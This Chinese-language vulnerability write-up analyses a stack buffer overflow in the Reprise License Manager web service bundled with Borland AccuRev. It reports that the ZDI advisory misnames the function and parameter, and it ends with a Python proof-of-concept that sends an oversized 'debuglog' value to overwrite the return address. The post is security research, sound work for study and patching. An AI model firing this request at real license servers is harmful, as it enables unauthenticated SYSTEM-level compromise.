> 原文链接: https://www.anquanke.com//post/id/82808 


# Borland AccuRev许可证服务器的缓冲区溢出漏洞


                                阅读量   
                                **70398**
                            
                        |
                        
                                                                                    



**[![](https://p4.ssl.qhimg.com/t01f632ed2b361cdaea.jpg)](https://p4.ssl.qhimg.com/t01f632ed2b361cdaea.jpg)**

**我最近看到zerodayinitiative发布了一个**[**http://www.zerodayinitiative.com/advisories/ZDI-15-416/Borland**](http://www.zerodayinitiative.com/advisories/ZDI-15-416/Borland)** AccuRev 许可证服务器的漏洞。**

他们关于这个漏洞的说明如下:<br>

这个漏洞允许远程的攻击者在安装有Borland AccuRev的服务器上执行任意命令,并且不需要认证。这个漏洞存在在service_startup_doit函数,在处理licfile参数的时候,有可能引发栈溢出。因为Reprise License Manager被安装成服务,因此攻击着可以获取SYSTEM权限。

通过ZDI的报告,我发现有2处欺骗的信息:

1.有问题的函数是"service_Setup_doit"而不是"service_startup_doit".

2.有问题的参数是"debuglog"而不是"licfile".

AccuRev的下载链接如下:

[http://www.reprisesoftware.com/license_admin_kits/rlm.v11.3BL1-x86_w1.admin.exe](http://www.reprisesoftware.com/license_admin_kits/rlm.v11.3BL1-x86_w1.admin.exe)

通过在rlm.exe里搜索service_startup_doit字符串并没有发现任何结果,我尝试搜索"service_" ,得到了下面的结果



[![](https://p0.ssl.qhimg.com/t01146ec5079d9063d0.png)](https://p0.ssl.qhimg.com/t01146ec5079d9063d0.png)



我不想根据这些字符串分析相应的函数,我这里用了其他的方法来尝试发现bug.

ZDI说漏洞函数能够被远程访问,所以我开始读RLM手册,找线索。RLM有一个web服务,监听5054,通过配合burpsuite我进行了一些fuzzing,最终在一个post请求里发现了"licfile"参数



[![](https://p4.ssl.qhimg.com/t016bcc1f8eacb63165.png)](https://p4.ssl.qhimg.com/t016bcc1f8eacb63165.png)



但是rlm.exe返回了错误信息,并没有崩溃



[![](https://p3.ssl.qhimg.com/t0122723663d2f48ec6.png)](https://p3.ssl.qhimg.com/t0122723663d2f48ec6.png)



我在immunity调试器里设置了断点,跟踪rlm.exe如果处理字符串长度。



[![](https://p3.ssl.qhimg.com/t014d91ac9ec4dd9756.png)](https://p3.ssl.qhimg.com/t014d91ac9ec4dd9756.png)



基于上面的ASM代码,rlm检测字符串的长度小于或等于0x400,来阻止缓冲区溢出。我这时候想,或许我下载的rlm.exe版本不存在漏洞,接着我继续fuzzing,最终发现,当发送给"debuglog"参数的字符串小于0x400的时候,能够绕过检测,覆盖栈的返回值为0x414141,所以我推断出,有漏洞的参数是"debuglog",而不是"licfile"



[![](https://p5.ssl.qhimg.com/t01eda88480b8c18b02.png)](https://p5.ssl.qhimg.com/t01eda88480b8c18b02.png)



我通过查看rlm.exe,发现它并不支持ASLR,但是这里有一个问题,rlm.exe地址里包含null,导致我们不能构造ROP,所以我这里是在XP系统上演示的,直接在栈里返回shellcode.

POC 代码如下:



```
import requests
url="http://10.211.55.39:5054/goform/service_setup_doit"
data= `{`
    'servicedesc':'RLM+License+Server',
    'servicename':'rlm',
    'action':'1',
    'debuglog':'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
    BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
    BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
    BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCC
    CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
    CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
    CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'+"x41x41x41x41",
    'licfile':'C:UsersusernameDesktoprlm-old'
    `}`
print requests.post(url, data=data).text
```

原文:[https://github.com/Rootkitsmm/Borland-AccuRev-StackoverFlow](https://github.com/Rootkitsmm/Borland-AccuRev-StackoverFlow)
